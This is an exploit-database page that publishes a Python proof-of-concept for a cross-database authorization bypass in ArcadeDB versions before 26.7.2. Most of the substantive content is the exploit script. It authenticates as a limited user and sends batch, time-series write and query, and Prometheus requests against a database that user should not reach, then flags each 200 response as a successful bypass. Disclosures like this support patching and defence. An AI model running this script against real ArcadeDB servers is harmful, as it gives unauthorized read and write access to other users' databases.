---
title: ArcadeDB <  26.7.2 Cross-Database Authorization Bypass (IDOR)
url: https://cxsecurity.com/issue/WLB-2026080001
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-08-02
fetch_date: 2026-08-03T05:31:30.011309
---

# ArcadeDB <  26.7.2 Cross-Database Authorization Bypass (IDOR)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **ArcadeDB < 26.7.2 Cross-Database Authorization Bypass (IDOR)** **2026.08.02**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-67342](https://cxsecurity.com/cveshow/CVE-2026-67342/ "Click to see CVE-2026-67342")**  CWE: **[CWE-639 Authorization Bypass Through User-Controlled Key](https://cxsecurity.com/cwe/CWE-639%20Authorization%20Bypass%20Through%20User-Controlled%20Key "Click to see CWE-639 Authorization Bypass Through User-Controlled Key")** | |

#!/usr/bin/env python3
# Exploit Title: ArcadeDB < 26.7.2 Cross-Database Authorization Bypass (IDOR)
# CVE: CVE-2026-67342
# Date: 2026-08-02
# Exploit Author: Mohammed Idrees Banyamer
# Author Country: Jordan
# Instagram: @banyamer\_security
# Author GitHub: https://github.com/mbanyamer
# Vendor Homepage: https://arcadedb.com
# Software Link: https://github.com/ArcadeData/arcadedb
# Affected: ArcadeDB < 26.7.2
# Tested on: ArcadeDB 26.7.1
# Category: Remote
# Platform: Multi
# Exploit Type: Authorization Bypass / IDOR
# CVSS: 9.3
# CWE : CWE-639
# Description: HTTP handlers for time series, batch, Prometheus and Grafana endpoints fail to validate database access permissions allowing cross-database read/write.
# Fixed in: 26.7.2
# Usage: python3 exploit.py <url> <user> <pass> <allowed\_db> <target\_db>
#
# Examples:
# python3 exploit.py http://127.0.0.1:2480 alice secret db\_a db\_b
#
# Options:
#
# Notes:
# Requires valid credentials for any database. Vulnerable endpoints return 200 while protected endpoints correctly return 403.
#
# How to Use
#
# Step 1: Provide target URL and credentials of a limited user
print(r"""
╔════════════════════════════════════════════════════════════════════════════════════════════╗
║ ║
║ ██████╗ █████╗ ███╗ ██╗██╗ ██╗ █████╗ ███╗ ███╗███████╗██████╗ ║
║ ██╔══██╗██╔══██╗████╗ ██║╚██╗ ██╔╝██╔══██╗████╗ ████║██╔════╝██╔══██╗ ║
║ ██████╔╝███████║██╔██╗ ██║ ╚████╔╝ ███████║██╔████╔██║█████╗ ██████╔╝ ║
║ ██╔══██╗██╔══██║██║╚██╗██║ ╚██╔╝ ██╔══██║██║╚██╔╝██║██╔══╝ ██╔══██╗ ║
║ ██████╔╝██║ ██║██║ ╚████║ ██║ ██║ ██║██║ ╚═╝ ██║███████╗██║ ██║ ║
║ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═══╝ ╚═╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚══════╝╚═╝ ╚═╝ ║
║ ║
║ [ b a n y a m e r \_ s e c u r i t y ] ║
║ ║
║ ▸ Silent Hunter | Shadow Presence | Digital Intel ◂ ║
║ ║
║ Operator : Mohammed Idrees Banyamer • Jordan 🇯🇴 ║
║ Handle : @banyamer\_security ║
║ ║
║ Exploit : CVE-2026-67342 ║
║ Target : ArcadeDB < 26.7.2 ║
║ ║
║ Status : ACTIVE ║
║ ║
╚════════════════════════════════════════════════════════════════════════════════════════════╝
""")
import requests
import sys
from requests.auth import HTTPBasicAuth
def exploit(target, username, password, allowed\_db, target\_db):
base = target.rstrip("/")
auth = HTTPBasicAuth(username, password)
print(f"[\*] Target : {base}")
print(f"[\*] Authenticated as: {username}")
print(f"[\*] Allowed DB : {allowed\_db}")
print(f"[\*] Target DB : {target\_db}")
print("-" \* 60)
print("[\*] Testing protected endpoint (should be 403)...")
r = requests.post(
f"{base}/api/v1/command/{target\_db}",
json={"language": "sql", "command": "SELECT FROM V LIMIT 1"},
auth=auth,
timeout=10
)
print(f" /api/v1/command/{target\_db} → {r.status\_code}")
endpoints = [
("POST", f"/api/v1/batch/{target\_db}", {"operations": []}),
("POST", f"/api/v1/ts/{target\_db}/write", {"metrics": []}),
("POST", f"/api/v1/ts/{target\_db}/query", {"query": "SELECT 1"}),
("GET", f"/api/v1/ts/{target\_db}/prom/api/v1/query", None),
]
print("\n[\*] Testing vulnerable handlers...")
for method, path, body in endpoints:
url = base + path
try:
if method == "POST":
r = requests.post(url, json=body, auth=auth, timeout=10)
else:
r = requests.get(url, auth=auth, timeout=10)
status = r.status\_code
if status == 200:
print(f" [+] {method} {path} → {status} (BYPASS SUCCESS)")
else:
print(f" [-] {method} {path} → {status}")
except Exception as e:
print(f" [!] {method} {path} → Error: {e}")
print("\n[\*] Done.")
if \_\_name\_\_ == "\_\_main\_\_":
if len(sys.argv) != 6:
print("Usage: python3 exploit.py <url> <user> <pass> <allowed\_db> <target\_db>")
print("Example: python3 exploit.py http://127.0.0.1:2480 alice secret db\_a db\_b")
sys.exit(1)
exploit(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4], sys.argv[5])

**##### References:**

https://github.com/ArcadeData/arcadedb/security/advisories/GHSA-x8mg-6r4p-87pf

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026080001)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top